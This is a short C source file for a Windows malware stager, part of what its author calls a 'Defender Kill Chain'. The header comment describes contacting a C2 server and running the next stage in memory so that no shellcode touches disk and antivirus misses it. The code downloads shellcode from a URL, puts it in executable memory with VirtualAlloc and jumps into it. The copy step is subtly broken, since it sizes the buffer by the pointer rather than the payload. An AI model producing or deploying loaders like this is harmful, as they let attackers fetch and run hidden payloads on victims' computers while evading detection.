#include <windows.h>
#include "webreq.h"
#include <stdio.h>
void execute_shellcode(char *shellcode);

/************************************************************************
Author:       Noah Ostle
Description:  This file is the first stager in our Defender Kill Chain.
              It Reaches out to the C2 server, and executes Stager 2, 
              the process injection stage, as shellcode inside its own
              memory.

              We hope that this remains undetected, since no shellcode 
              is ever stored on the disk. To an AV's static analysis,
              this file just reaches out to the web, and executes some
              shellcode.
************************************************************************/


int main() {
    unsigned char* shellcode=fetch_url("http://localhost:3000/MessageBoxShellcode");
    printf("%s", shellcode);
    execute_shellcode(shellcode);
}



void execute_shellcode(char *shellcode){
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)(); // Execute shellcode
}
